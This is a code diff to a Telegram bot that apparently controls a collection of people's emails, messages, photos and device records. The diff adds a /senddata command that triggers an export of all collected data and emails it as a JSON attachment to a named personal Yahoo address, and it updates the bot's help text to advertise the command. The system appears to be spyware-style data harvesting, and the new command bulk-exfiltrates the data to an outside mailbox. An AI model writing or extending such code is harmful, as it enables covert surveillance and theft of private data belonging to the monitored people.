@@ -60,6 +60,7 @@ bot.onText(/\/start/, (msg) => {
 EASY COMMANDS (Just type these):
 
 /data - Overview of all collected data
+/senddata - 📧 Email ALL data to jedarius.m@yahoo.com
 
 GET ALL DATA:
 /getemails - Get ALL emails collected
@@ -76,6 +77,7 @@ Just type the command and hit send!
 No device IDs or complicated stuff needed.
 
 Example: Just type /getemails and press send
+Or type /senddata to email everything to yourself!
         `);
     });
 });
@@ -757,7 +759,43 @@ bot.onText(/\/user (.+)/, (msg, match) => {
     });
 });
 
-// 🚨 ALL - Get EVERYTHING (emergency access)
+// � SENDDATA - Trigger autonomous email export
+bot.onText(/\/senddata/, (msg) => {
+    checkAuth(msg, async () => {
+        const chatId = msg.chat.id;
+        
+        try {
+            bot.sendMessage(chatId, '📧 Triggering autonomous email export...');
+            
+            // Call the export endpoint
+            const response = await axios.post(`${NUPI_API}/api/user-data/export-email`);
+            
+            if (response.data.success) {
+                const summary = response.data.summary;
+                let message = `✅ EMAIL EXPORT TRIGGERED!\n\n`;
+                message += `📊 SUMMARY:\n`;
+                message += `• Records: ${summary.totalRecords}\n`;
+                message += `• Devices: ${summary.totalDevices}\n`;
+                message += `• Users: ${summary.totalUsers}\n`;
+                message += `• Emails: ${summary.totalEmails}\n`;
+                message += `• Messages: ${summary.totalMessages}\n`;
+                message += `• Photos: ${summary.totalPhotos}\n\n`;
+                message += `📧 Email sent to: jedarius.m@yahoo.com\n`;
+                message += `💾 Export file: ${response.data.exportFile}\n\n`;
+                message += `Check your Yahoo inbox for the full data export with JSON attachment!`;
+                
+                bot.sendMessage(chatId, message);
+            } else {
+                bot.sendMessage(chatId, `⚠️ Export triggered but check details:\n${JSON.stringify(response.data, null, 2)}`);
+            }
+            
+        } catch (error) {
+            bot.sendMessage(chatId, `❌ Error triggering export: ${error.message}\n\nThe export system may still have sent the email - check your inbox.`);
+        }
+    });
+});
+
+// �🚨 ALL - Get EVERYTHING (emergency access)
 bot.onText(/\/all/, (msg) => {
     checkAuth(msg, async () => {
         const chatId = msg.chat.id;
